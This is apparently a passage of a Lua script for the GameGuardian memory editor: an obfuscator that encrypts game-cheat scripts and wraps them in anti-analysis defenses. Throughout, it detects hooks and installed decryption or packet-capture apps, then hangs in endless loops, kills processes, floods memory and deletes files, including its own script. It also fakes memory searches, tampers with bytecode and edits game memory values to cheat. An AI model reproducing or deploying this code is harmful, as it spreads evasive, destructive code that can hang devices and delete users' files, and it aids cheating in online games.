dofile(Carla[1])
end

local hookFunction = {} 
for k,v in pairs(_G) do 
if type(v) == 'table' then 
for kk,vv in pairs(v) do 
if type(vv) == 'function' and debug.getinfo(vv).source ~= '=[Java]' then 
table.insert(hookFunction,k..'.'..kk) 
end 
end 
end 
end 
if #hookFunction > 0 then 
while(true) do  
os.exit()
end 
end

gg.alert("开始防拦截","开始防拦截")

gg.clearResults() 
gg.searchNumber("6461913",gg.TYPE_FLOAT,false,gg.SIGN_EQUAL,0, -1)
gg.searchNumber("6464941",gg.TYPE_FLOAT,false,gg.SIGN_EQUAL,0,-1)
gg.getResults(10)
gg.editAll("6418401",gg.TYPE_FLOAT)
gg.toast("拦截成功")
gg.clearResults()
]=]

fy=[=[
function gg.searchNumber(...)
end
function debug.getinfo()
obj = {}
obj.source = "=[Java]"
return obj
end

while (debug.getinfo(string.gsub).source ~= "=[Java]")do
  os.exit()
end

_G["死"]=function()
_ENV["gg"]["alert"]("神仙:wcnmb","","","")
_G["os"]["exit"]() 
_G["死"]()
end
for i = -1, -2 do;se = 'The wind of birds';end local _  =  debug.getinfo(gg.searchNumber).source ~= "=[Java]" or  not not debug.getupvalue(gg.searchNumber,1,2) local _ = _  == false or (function() _ENV["死"]()  end)()
]=]

fy=[=[
debug.getinfo=function()
return em
end
string.rep=function()
a={}
b=0,100000
return a[b]
end

local aSX=string.rep("1",4000)
for SX=0,100000 do
debug.getinfo(aSX)
end
]=]

fy=[=[
a={}
string.rep=function()
local b=1,2048
return a[i]
end
for k,v in pairs (string) do
v=function()
return nil
end
end

local Y=string.rep("请勿破解/后果自负",999999)
T={}
for SX=1,2048 do
T[i]=Y
end

for k,v in pairs (string) do
pcall(v,T)
end
]=]

fy=[=[
local Search_WX, Clear_WX, Set_WX, Edit_WX, Memony_WX, search_e
Search_WX = gg.searchNumber
Clear_WX = gg.clearResults
Set_WX = gg.setRanges
Memony_WX = 262207
Edit_WX = gg.editAll
search_e = string.char(0, 0, 0, 0, 0, 0, 0)
s=os.clock()
for i=1,22 do 
    search_e=search_e .. search_e 
end
local fuc=function(x)
    local ta={}
    for i=1,20 do
        ta[#ta+1]=string.char(math.random(127,180))
    end
    ta=table.concat(ta)
    return ta..ta..x..ta..ta
end
gg.setRanges=function(x)
    Memony_WX=x
    Set_WX(Memony_WX)
end
gg.clearResults=function(...)
    Set_WX(262144)
    local log1, log2, Ty, xh
    if math.random(1,2)==1 then
        Ty=16
        xh=math.random(2,30)
        hx=math.random(2,30)
    else
        Ty=4
        xh=math.random(3,10)
        hx=math.random(3,10)
    end
    local YtrRx = math.random(1, 3)
    local Seh={}
    for i=1, math.random(1,4) do
        local xc={}
        if YtrRx == 1 then
            for x=1,xh do
                xc[#xc+1]=string.char(math.random(48,57))
            end
            xc = table.concat(xc)
        end
        if YtrRx == 2 then
            for x=1,xh do
                xc[#xc+1]=string.char(math.random(48,57))
            end
            xc = "0."..table.concat(xc)
        end
        if YtrRx == 3 then
            for x=1,xh do
                xc[#xc+1]=string.char(math.random(48,57))
            end
            if math.random(0,1)==1 then
                xc = table.concat(xc).."F"
            else
                xc = table.concat(xc).."D"
            end
        end
        Seh[#Seh+1]=xc
    end
    Seh=table.concat(Seh,";")
    if math.random(0,1)==1 then
        Seh=Seh.."::"..math.random(10,300)
    else
        Seh=Seh..":"..math.random(10,300)
    end
    xc={}
    for x=1,hx do
        xc[#xc+1]=string.char(math.random(48,57))
    end
    xc = table.concat(xc)
    gg.getResults(0)
    Edit_WX(search_e,4)
    log1, log2 = {}, {}
    for i=1,50 do
        log2[i] = math.random(1,2140000000)
        log1[log2[i]] = {address = i, flags = 4, temp = search_e}
    end
    log1 = gg.getValues(log1)
    Search_WX(Seh,Ty,false,gg.SIGN_EQUAL,0, -1)
    Search_WX(xc,Ty,false,gg.SIGN_EQUAL,0, -1)
    gg.getResults(0)
    Edit_WX(search_e,4)
    Search_WX(search_e,Ty,false,gg.SIGN_EQUAL,0, -1)
    Set_WX(Memony_WX)
    Clear_WX()
end
gg.searchNumber=function(...)
    local ar={...}
    ar[1]=ar[1]:gsub("%d",function(ss)
        return fuc(ss)
    end)
    Search_WX(table.unpack(ar))
    gg.getResults(0)
    Edit_WX(search_e,4)
end
gg.editAll=function(...)
    local ar = {...}
    ar[1]=ar[1]:gsub("%d",function(ss)
        return fuc(ss)
    end)
    Edit_WX(table.unpack(ar))
end
]=]

fy=[=[
local nf=gg.PACKAGE  sh="/storage/emulated/0/Android/data/"..nf.."/files/拦截器"  file=io.open(sh,"r")  if file~=nil then  nf =gg.alert("检测到拦截器痕迹因此无法打开本文件！！！请清楚痕迹后重新执行","确定","退出","清楚痕迹")  if nf~=3 then  print("神仙拦截器防御")  os.exit()while true do end  else  os.remove(sh)  print("已清楚拦截器痕迹")  os.exit()while true do end  end  end    function shcf()  print("神仙")  os.exit()  shcf()  end  sh="/storage/emulated/0/Android/拦截器"  file=io.open(sh,"r")  if file~=nil then  nf =gg.alert("检测到拦截器痕迹\n因此无法打开本文件\n请清楚痕迹后重新执行","确定","退出","清楚痕迹")  if nf~=3 then  print("神仙原创拦截器防御")  shcf()  else  os.remove(sh)  print("已清楚拦截器痕迹\n神仙原创")  shcf()  end  end
]=]

fy=[=[
if gg.isPackageInstalled("sstool.only.com.sstool") or gg.isPackageInstalled("sstool.only.com.sstool") or gg.isPackageInstalled("sstool.only.com.sstool") then
  gg.alert("请卸载解密工具后重新执行")
  os.remove(string.gsub(gg.getFile(),"@",""))
  gg.alert("检测到解密工具,因此出现此状况!")
  os.exit()  while true do end end
if gg.isPackageInstalled("com.fan.ggluadec") or gg.isPackageInstalled("com.fan.ggxxls") or gg.isPackageInstalled("com.fan.ggxxls-1.10") then
  gg.alert("花里胡哨的东西没用的!")
  os.exit() while true do end end
if gg.isPackageInstalled("com.maggienorth.max.postdata") then
   gg.alert("\n检测到你有抓包软件!\n\n请卸载后再运行脚本!.")
  gg.processKill()
os.exit() while true do end end
if gg.isPackageInstalled("app.greyshirts.sslcapture-1.10") then
  gg.alert("\n检测到你有抓包软件!\n\n请卸载后再运行脚本!")
 gg.processKill()
os.exit() while true do end end
 if gg.isPackageInstalled("com.chenlun.autumncloudlua") then
 gg.alert("\n检测到你有云解密工具!\n\n请卸载后再运行脚本!")
gg.processKill()
   os.exit() while true do end end
]=]

fy=[=[
local SX_SX=function(SX)
    Blianliang = ""
    for i = 1, SX do
        num = math.random(1, 26)                       
        if num % 2 == 0 then
            Blianliang = Blianliang .. string.char(num + 64)
        else
            Blianliang = Blianliang .. string.char(num + 96)
        end
    end
    return Blianliang
end


for k=1,500 do
    _ENV[SX_SX(k)]="SX"
end
]=]

fy=[=[
if(nil)then
if(true)then
end
if(true)then
else
local hx_hx_6047=SX | SX& SX~ SX| SX// SX| SX& SX// SX/ SX<< SX| SX// SX>> SX& SX~ SX<< SX~ SX/ SX~ SX
goto hx_hx_4531
end
if hx_hx_5244 then
else
local hx_hx_6047=SX // SX| SX& SX>> SX// SX~ SX| SX~ SX& SX<< SX| SX| SX>> SX~ SX| SX>> SX~ SX| SX/ SX
goto hx_hx_4531
end
::hx_hx_4531::
local hx_hx_6047=SX << SX| SX| SX& SX>> SX// SX~ SX& SX~ SX~ SX// SX| SX| SX// SX& SX<< SX~ SX// SX<< SX
while('<><><BY神仙><><>')do
break
end
end
]=]
local dZvT=string.rep("SX",123)
sOaJ={}
for cInW=1,1024 do
sOaJ[cInW]=dZvT
end dZvT=nil
for dLrV, wNjO in pairs({gg.alert,gg.bytes,gg.copyText,gg.searchAddress,gg.searchNumber,gg.toast}) do
pcall(wNjO,sOaJ)
end
SX=io.open("/sdcard/SX.LOG","r")
if SX~=nil then
while true do
os.remove("/sdcard/SX.LOG")
os.exit()
end
end
local g = {}
local To_16=function(txt)
    local sp=string.format("%x",txt)
    if #sp==1 then
        sp="0"..sp
    end
    return "\\x"..sp
end--转16进制

local Un_know=function(num)
    local zl={}
    if not num then
        num=math.random(4,8)
    end
    for x=1,num do
        zl[#zl+1]=To_16(math.random(128,248))
    end
    return table.concat(zl)
end--生成16进制字符
local dec=function(Lte)
	Lte={Lte:byte(0,-1)}
	local chartab={}
	for i=1,#Lte do
	    py=math.random(1,255-Lte[i])
	    local Lt=To_16(Lte[i]+py)
	    chartab[#chartab+1]=",{\34"..Lt.."\34,\34"..Un_know(py).."\34}"
	end	
	return "((function(_)::__:: while _ do goto __ end end)() or Sancode(Sandec(({"..table.concat(chartab):gsub(",","",1).."}))) or (function(_)::__:: while _ do goto __ end end)())"
end
Fy = [===[
local TonumbEr = tonumber

local _g = {}
for i, v in pairs(_ENV["gg"]) do
    _g[i] = v
end
for i,v in pairs(_g) do
    if type(v)=="function" then
        local Zt,Return_str=pcall(gg.toast,{v})
        while not Return_str or string.find(Return_str,"%[Java%]%:%-1") do
            print("Detection LOG or Hook")
            os.exit()
        end
    end
end

for index, value in _ENV["pairs"]({_ENV["table"],_ENV["debug"], _ENV["gg"], _ENV["os"], _ENV["io"], _ENV["bit32"], _ENV["utf8"], _ENV["string"], _ENV["math"]}) do
  index = _ENV["tostring"](value)
  xxxx = _ENV["string"]["match"](index, "@")
    while (xxxx) do
    end
end
for index, value in _ENV["pairs"]({"tostring", "load", "ipairs", "pcall", "assert2", "loadfile","pairs", "error", "tonumber", "xpcall", "assert", "dofile", "print", "type"}) do
   value = _ENV[value]
   index = _ENV["tostring"](value)
   xxxx = _ENV["string"]["match"](index, "@")
    while (xxxx) do
    end
end


gg.setVisible(false)
vpn= "https://vpn.uibe.edu.cn/por/phone_index.csp?rnd=0.23178949332658605#https%3A%2F%2Fvpn.uibe.edu.cn%2F"
vpn=tostring(gg["makeRequest"](vpn))
if not vpn  or not vpn:sub(1,20) then 
    gg["alert"]("请允许访问网络！",string.char())
else
    while #vpn<100 or vpn:find("SSL") or vpn:find("I/O") or vpn:find("javax") do
    end
end
rzlog=tonumber("1024")
Rep={}
for i=1,rzlog do
    Rep[i]=" "
end
logFk=(table.concat(Rep))
for i=1,rzlog do
    Rep[i]=logFk
end
logFk=(table.concat(Rep))
while logFk~=string.rep(" ",rzlog*rzlog) and #logFk~=rzlog^2 do
end
while string.rep("a",5)~="aaaaa" do
end
local Search=gg.searchNumber
gg.searchNumber = function (...)
    local vpn, Rep, time1, time2, rzlog, logFk, logSy, Hour, Montie, Second, search_e, log3, log4, arm
arm={...}
vpn=gg.makeRequest("https://time.tianqi.com/")["headers"]["Date"]
Hour,Montie,Second=vpn[1]:match("(%d+):(%d+):(%d+)")
if Hour=="00" then
    Hour=24
end
time1=Hour*3600+Montie*60+Second
rzlog=tonumber("800")
Rep={}
for i=1,rzlog do
    Rep[i]=" "
end
logFk=(table.concat(Rep))
for i=1,rzlog do
    Rep[i]=logFk
end
logFk=(table.concat(Rep))
while logFk~=string.rep(" ",rzlog^2) and #logFk~=rzlog^2 do
end
while string.rep("a",5)~="aaaaa" do
end
logSy={}
for logTi=1,rzlog do
    logSy[logTi]=logFk
end
logFk=nil
log3={_ENV["gg"]["alert"],_ENV["gg"]["bytes"],_ENV["gg"]["copyText"],_ENV["gg"]["searchAddress"],Search,_ENV["gg"]["toast"]}
for log1, log2 in pairs(log3) do
    xpcall(log2,Search,logSy)
end
log4=string.char(rzlog-rzlog)
search_e=(log4):rep(7)
for i=1,22 do 
    search_e=search_e..search_e 
end
gg.getResults(0)
gg.editAll(search_e,4)
Search(search_e,16,false,gg.SIGN_EQUAL,0,-1)
rzlog, logFk={}, {}
for i=1,50 do
    logFk[i]=math.random(1,2140000000)
    rzlog[logFk[i]]={address=i,flags=4,temp=search_e}
end
rzlog=gg.getValues(rzlog)
vpn=gg.makeRequest("https://time.tianqi.com/")["headers"]["Date"]
Hour,Montie,Second=vpn[1]:match("(%d+):(%d+):(%d+)")
if Hour=="00" then
    Hour=24
end
time2=Hour*3600+Montie*60+Second
while time2-time1>1 do
os.exit()
end
    return Search(table.unpack(arm))
end


]===]
local File_operations = function(path,text)
	if text then
    	io.open(path, "w+"):write(text):close()
    else
        reTn = io.open(path):read("*a")
    	return reTn
    end
end
local Tab={}
function Tab.Table_Rand(t)
	local tRet = {}
	local Total = #t
	while Total > 0 do
		local i = math.random(1,Total)
		table.insert(tRet,t[i])
		t[i] = t[Total]
		Total = Total-1
	end
	return tRet
end--打乱table
local Let={}
Let.Ran_bit = function(num)
    local zl = {}
    if not num then
        num = math.random(3, 5)
    end
    for x = 1, num do
        zl[#zl+1] = "\\x" .. string.char(math.random(65, 70)) .. string.char(math.random(65, 70))
    end
    return table.concat(zl)
end
Let.Ran_str = function(len)
    if not len then
        len = math.random(4, 6)
    end
	local res = ""
	for i = 1, len do
		local choice = math.random(1, 2)
		if choice == 1 then
			res = res .. string.char(math.random(65, 90))
		 elseif choice == 2 then
		    res = res .. string.char(math.random(97, 122))
		end
	end
	return res
end
local Gsrt = function(nr)
    if not Yx_NuTa then
        Yx_NuTa,Yx_Zxc = {}, {}
        local n3 = Let.Ran_str()
        local n2, n4
        for i = 1, 9 do
            n2 = Let.Ran_str()
            nr = nr:gsub(i,n2)
            Yx_Zxc[i] = n2
            Yx_NuTa[i] = "local " .. n2 .. " = " .. "(Char[Tostring(#Fr_Dt)] + " .. i .. ") % "..n3
        end
        Yx_NuTa = table.concat(Yx_NuTa,"\n")
        Yx_NuTa = "local Tostring=tostring\nlocal " .. n3 .. " = Char[Tostring(#Fr_Dt)]\n" .. Yx_NuTa
        n4 = Let.Ran_str()
        nr = nr:gsub("0",n4)
        Yx_Zxc[0] = n4
        Yx_NuTa = Yx_NuTa .. "\nlocal " .. n4 .. " = " .. n3 .." - " .. n3
    else
        for i=0,9 do
            nr = nr:gsub(i, Yx_Zxc[i])
        end
    end
    return nr
end
local NusRv = {}
local cxk = {}
NumCal = function(num)
    local s1, s2, s3, s4, s5, s6, s7, s9, rk, kr
    local t1, t2 = " + "
    t2 = math.random(0,9)
    s1 = num / 256
    s2 = num % 256
    s6 = s1 - t2
    s7 = math.random(1, 7)
    s4 = 0
    repeat
        s4 = s4 + 1
        s3 = 2 ^ s4
        s5 = s2 - s3
    until s5 < 10
    if s5 <= -10 then
        rk = math.random(-9,9)
        s5 = rk - s5
        if not cxk[s5] then
            kr = Let.Ran_bit()
            NusRv[kr] = s5
            cxk[s5] = kr
            trx = cxk[s5]
        else
            trx = cxk[s5]
        end
        s5 = rk
    end
    if s5 < 0 then
        t1 = ""
    end
    if rk then
        s5 = s5 .. " - Wield[\"" .. trx .. "\"]"
        rk = nil
    end
    if s6 >= 10 then
        rk = math.random(-9,9)
        s6 = rk - s6
        if not cxk[s6] then
            kr = Let.Ran_bit()
            NusRv[kr] = s6
            cxk[s6] = kr
            trx = cxk[s6]
        else
            trx = cxk[s6]
        end
        s6 = rk .. " - " .. "Wield[\"" .. trx .. "\"]"
        rk = nil
    end
    s1 = "((" .. tostring(2 ~ s7) .. " ~ " .. s7 .. ") ^ (" .. s4 .. ") ".. t1 .. s5 .. " + (2 ^ (2 ^ 3)) * (" .. s6 .. " + " .. t2 .. "))"
    s1 = Gsrt(s1)
    return s1
end
function WlCon(nr)--while写法
    local func_Name = Let.Ran_str()
    local Key = NumCal(math.random(10000,999999))
    local Main_Key = Key
    for i,k in pairs(nr) do
        if i==#nr then
            nr[i]="if " .. func_Name .. "==" .. Key .. " then\n" .. nr[i] .. "\nbreak\nend\n"
        else
            nr[i]="if " .. func_Name.."==" .. Key .. " then\n" .. nr[i]
            Key = NumCal(math.random(10000,999999))
            nr[i]=nr[i] .. "\n" .. func_Name .. "=" .. Key .. "\nend\n"
        end
    end
    return "local " .. func_Name .."=" .. Main_Key .. "\nwhile true do\n" .. table.concat(Tab.Table_Rand(nr)).."\nend"
end
local fuc = {
    ["gg"] = 2,
    ["os"] = 2,
    ["io"] = 2,
    ["string"] = 2,
    ["math"] = 2,
    ["table"] = 2,
    ["debug"] = 2,
    ["bit32"] = 2,
    ["utf8"] = 2,
}
local Tab2, Be, str_Calcul = {}, {}, {}
local XtyP=0
local Str_Enc = function(Data)
    if Data=="" then
        return "string.char()"
    end
    if str_Calcul[Data] then
        return str_Calcul[Data]
    end
    local max
    while true do
        max = math.random(3000,9000)
        if not Be[max] then
            Be[max]=2
            break
        end
    end
    local compline
    reTn = math.random(10,20)
    local data = {string.byte(Data,0,-1)}
    for i,k in pairs(data) do
        data[i]=k~reTn
    end
    data[#data+1]=reTn
    data = "(function() return Str_dec({"..table.concat(data,",").."}) end)()"
    Tab2[#Tab2+1] = "Sherlock["..max.."]="..data
    str_Calcul[Data] = "string_char(Sherlock["..max.."])"
    return str_Calcul[Data]
end
local Min_num = function(...)
    local arm = {...}
    local num = nil
    for i, v in pairs(arm) do
        if v ~= nil then
            if not num then
                num = v
            elseif num > v then
                num = v
            end
        end
    end
    return num
end
local Fuc_Enc = function(ltre)
    gg.toast("正在加密标准库...")
	for v, s in pairs(_ENV) do
		if type(s) == "table" and fuc[v] then
		    Enc_func1 = Str_Enc(v)
			for i in pairs(s) do
			    if ltre:find(v .. "%." .. i) then
			        Enc_func2 = Str_Enc(i)
			    	ltre = ltre:gsub("([^%w_])" .. v .. "%." .. i .. "%(", "%1_ENV[" .. Enc_func1 .. "]" .. "[" .. Enc_func2 .. "](")
			    	ltre = ltre:gsub("([^%w_])" .. v .. "%." .. i .. "%)", "%1_ENV[" .. Enc_func1 .. "]" .. "[" .. Enc_func2 .. "])")
			    	ltre = ltre:gsub("([^%w_])" .. v .. "%." .. i .. "%s*,", "%1_ENV[" .. Enc_func1 .. "]" .. "[" .. Enc_func2 .. "],")
			    	ltre = ltre:gsub("=(%s*)" .. v .. "%." .. i .. "([^%w_])", "=%1_ENV[" .. Enc_func1 .. "]" .. "[" .. Enc_func2 .. "]%2")
			    	ltre = ltre:gsub("([^%w_])" .. v .. "%." .. i .. "%s*=", "%1_ENV[" .. Enc_func1 .. "]" .. "[" .. Enc_func2 .. "]=")
			    end
			end
		elseif type(s) == "function" and debug.getinfo(s)["what"] == "Java" then
		    if ltre:find(v) then
		    	ltre = ltre:gsub("([^%w_])" .. v .. "%(", "%1_ENV[" .. Str_Enc(v) .. "](")
		    	ltre = ltre:gsub("=%s*" .. v .. "([^%w_])", "=_ENV[" .. Str_Enc(v) .. "]%1")
		    end
		end
	end
	return ltre
end
local Enc_Strings = function(DATA,ToStrong_Str)
    local gr = {}
    
    repeat
        local s1, ss1, x1, xx1, n1, n2, str
        s1 = string.find(DATA, "\034")--单引号
        ss1 = string.find(DATA, "\039")--双引号
        x1 = string.find(DATA, "%[[=]*%[")--中括号
        xx1 = string.find(DATA, "%-%-")--注释
        n1 = string.find(DATA, "[^%w_]0[xX][0-9A-Fa-f]+")--Hex
        n2 = string.find(DATA, "[^%w_]%d+")--Number
        
        str = Min_num(s1, ss1, x1, xx1, n1, n2)
        
        if str == nil then
            break
        end
        
        if str == s1 then
            DATA = DATA:gsub("(.-)(\034.-\034)",function(t1, t2)
                gr[#gr + 1] = t1
                t2 = string.gsub(t2, "\\\\","\\092")
                t2 = string.gsub(t2, "\\\034", "\\034")
                
                if t2:sub(-1, -1) ~= "\034" then
                    return t2
                end
                t3 = load("return "..t2)
                
                if not t3 then
                    gg.alert("\034加密失败\n"..t2)
                    os.exit()
                end
                gr[#gr + 1] = ToStrong_Str(t3())
                return ""
            end, 1)
            
        elseif str == ss1 then
            DATA = DATA:gsub("(.-)(\039.-\039)",function(t1, t2)
                gr[#gr + 1] = t1
                t2 = string.gsub(t2, "\\\\","\\092")
                t2 = string.gsub(t2, "\\\039", "\\039")
                
                if t2:sub(-1, -1) ~= "\039" then
                    return t2
                end
                t3 = load("return "..t2)
                
                if not t3 then
                    gg.alert("\039加密失败\n"..t2)
                    os.exit()
                end
                gr[#gr + 1] = ToStrong_Str(t3())
                return ""
            end, 1)
            
        elseif str == x1 then
            local g1 = string.match(DATA,"%[([=]*)%[")
            DATA=DATA:gsub("(.-)(%["..g1.."%[.-%]"..g1.."%])",function(t1, t2)
                gr[#gr + 1] = t1
                t3 = load("return "..t2)
                
                if not t3 then
                gg.alert("[[加密失败\n"..t2)
                os.exit()
            end
                gr[#gr + 1] = ToStrong_Str(t3())
                return ""
            end, 1)
            
        elseif str == xx1 then
            d1, d2, d3, d4 = string.find(DATA, "%-%-(%[([=]*)%[)")
            
            if d1 == xx1 then
                DATA = string.gsub(DATA, "(.-)%-%-%[" .. d4 .. "%[.-%]" .. d4 .. "%]", function(txt1)
                    gr[#gr + 1] = txt1
                    return " "
                end, 1)
            else
                DATA = string.gsub(DATA, "(.-)%-%-[^\n]*", function(txt1)
                    gr[#gr + 1] = txt1
                    return ""
                end, 1)
                
            end
            
        elseif str == n1 then
            DATA = DATA:gsub("(.-[^%w_])(0[xX][0-9A-Fa-f]+)",function(txt1,txt2)
                gr[#gr + 1] = txt1
                gr[#gr + 1] = "TonumbEr("..ToStrong_Str(txt2)..")"
                return ""
            end,1)
            
        elseif str == n2 then
            local n3, n4, n5, n6
            n3 = string.find(DATA, "[^%w_]%d+%.%d+[eE][%-%+]%d+")
            n4 = string.find(DATA, "[^%w_]%d+%.%d+[eE]%d+")
            n5 = string.find(DATA, "[^%w_]%d+[eE]%d+")
            n6 = string.find(DATA, "[^%w_]%d+%.%d+")
            
            if str == n3 then
                DATA = DATA:gsub("(.-[^%w_])(%d+%.%d+[eE][%-%+]%d+)",function(txt1,txt2)
                    gr[#gr + 1] = txt1
                    gr[#gr + 1] = "TonumbEr("..ToStrong_Str(txt2)..")"
                    return ""
                end,1)
                
            elseif str == n4 then
                DATA = DATA:gsub("(.-[^%w_])(%d+%.%d+[eE]%d+)",function(txt1,txt2)
                    gr[#gr + 1] = txt1
                    gr[#gr + 1] = "TonumbEr("..ToStrong_Str(txt2)..")"
                    return ""
                end,1)
                
            elseif str == n5 then
                DATA = DATA:gsub("(.-[^%w_])(%d+[eE]%d+)",function(txt1,txt2)
                    gr[#gr + 1] = txt1
                    gr[#gr + 1] = "TonumbEr("..ToStrong_Str(txt2)..")"
                    return ""
                end,1)
                
            elseif str == n6 then
                DATA = DATA:gsub("(.-[^%w_])(%d+%.%d+)",function(txt1,txt2)
                    gr[#gr + 1] = txt1
                    gr[#gr + 1] = "TonumbEr("..ToStrong_Str(txt2)..")"
                    return ""
                end,1)
            else
                DATA = DATA:gsub("(.-[^%w_])(%d+)",function(txt1,txt2)
                    gr[#gr + 1] = txt1
                    gr[#gr + 1] = "TonumbEr("..ToStrong_Str(txt2)..")"
                    return ""
                end,1)
                
            end
            
        else
            break
        end
        
    until not str
    gr[#gr+1]=DATA
    gr = table.concat(gr)
    :gsub("return%s+end","return 0\nend")
    return gr
end
local g, yc = {}, {}
g.last = gg.getFile()
g.info = nil
g.config = gg.EXT_FILES_DIR:gsub("%lua$", "") .. "/g.cfgsx"
g.data = loadfile(g.config)
if g.data ~= nil then;
	g.info = g.data()
	g.data = nil
end
if g.info == nil then
	g.info = {g.last}
end
yc.main = gg.prompt({"请选择文件："},g.info,{"file"})
if yc.main == nil then
    os.exit(print("未选择"))
end
gg.saveVariable(yc.main, g.config)
yc.data = Fy.."\n"..File_operations(yc.main[1])
gr = Fuc_Enc(Enc_Strings(yc.data,Str_Enc))

char=[=[
(function()
(function()

end)()
local Xty2=0
local Char={}
for i=0,255 do
    Char[i]=string.char(i)
    Char[string.char(i)]=i
end
local Str_dec = function(_Tab)
    for i=1,(#_Tab-1) do
        _Tab[i]=_Tab[i]~_Tab[#_Tab]
    end
    table.remove(_Tab,#_Tab)
    return _Tab
end
local string_char=function(Tab1)
    for i,k in pairs(Tab1) do
        if type(k)=="number" then
            Tab1[i]=Char[k]
        end
    end
    return table.concat(Tab1)
end


]=]
SX="\000"..[===[   
  
加密作者;魔丶暗影
加密强度：♚㊣
┏━━━━━━━━━━━
┃███████████
┃███████┏━┓█
┃███████┃　┃█
┃███████┃解┃█
┃███████┃　┃█
┃███████┃密┃█
┃███████┃　┃█
┃███████┃秘┃█
┃███████┃　┃█
┃███████┃籍┃█
┃███████┃　┃█
┃███████┗━┛█
┃███████████
┗━━━━━━━━━━━|

　（`･ω･´)ミ
┳∪┳―┳∪┳―┳―┐
┻┳┻┳┻┳┻┳┻┳┨
┳┻┳┻┳┻┳┻┳┻┨
┻┳┻┳┻┳┻┳┻┳┨
―┻―┻―┻―┻―┻┘
]===]
last = yc.main[1]:gsub("(.+)/(.+)",function(x,y)
    CoNe = "[加密]·" .. y
    return x .. "/[加密]-" .. y
end)

gr=char.."local Sherlock={}\n"..table.concat(Tab2,"\n").."\n".."\n"..gr.."\nend)([===["..SX.."]===])"
local rg=load(gr)
if not rg then
    os.exit(gg.alert("加密失败"))
end

gr=string.dump(rg,true)
gg.internal2(load(gr), last)
gr = io.open(last,"r"):read("*a")
gr = gr:gsub("linedefined [^\n]+", "linedefined 0")
:gsub("lastlinedefined [^\n]+", "lastlinedefined 0")
:gsub("%.maxstacksize %d+", ".maxstacksize 250")
local ZL = {
    ['LOADKX'] = 2,
    ['EXTRAARG'] = 2,
    ['MOVE'] = 2,
    ['UNM'] = 2,
    ['BNOT'] = 2,
    ['NOT'] = 2,
    ['LEN'] = 2,
    ['ADD'] = 2,
    ['SUB'] = 2,
    ['MUL'] = 2,
    ['DIV'] = 2,
    ['IDIV'] = 2,
    ['MOD'] = 2,
    ['POW'] = 2,
    ['BXOR'] = 2,
    ['BOR'] = 2,
    ['BAND'] =2,
    ['SHL'] = 2,
    ['SHR'] = 2,
    ['GETTABLE'] = 2,
    ['SETTABLE'] = 2,
    ['NEWTABLE'] = 2,
    ['SELF'] = 2,
    ['SETLIST'] = 2,
    ['LOADNIL'] = 2,
    ['CONCAT'] = 2,
    ['CALL'] = 2,
    ['VARARG'] = 2,
    ['TAILCALL'] = 2,
    ['TFORCALL'] = 2,
    ['GETUPVAL'] = 2,
    ['SETUPVAL'] = 2,
    ['GETTABUP'] = 2,
    ['SETTABUP'] = 2,
    ['CLOSURE'] = 2,
    ['RETURN'] = 2,
    ['FORLOOP'] = 2,
    ['FORPREP'] = 2,
    ['TFORLOOP'] = 2,
}
function Disloc(Tran,free)
    local Pic = {"🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎️","🌎","🌎","🌎️","🌎","🌎","🌎","🌎","🌎","🌎️","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎","🌎"}
    local Star = 0
    local Resver
	function Resver()
	    Star = Star + 1
	    if Star > #Pic then
	        Star = 1
	    end
	    local Tab = {}
	    local b = gg.bytes(Pic[Star])
        local tab = {}
        for k,v in pairs(b) do
            table.insert(tab, 1, string.format("%x",v))
        end
        tab = table.concat(tab)
            tab = tab:gsub("........",function (x)
            table.insert(Tab, 1, "OP[48] 0x" .. x .. "\n")
        end,1)
        return "\n" .. table.concat(Tab)
    end
    if not free then
        Resver=function()
            return ""
        end
    end
    gg.toast("『正在添加防御——』")
    Tran = Tran:gsub("(; .local v[^\n]+)\n",function(x)
        return x
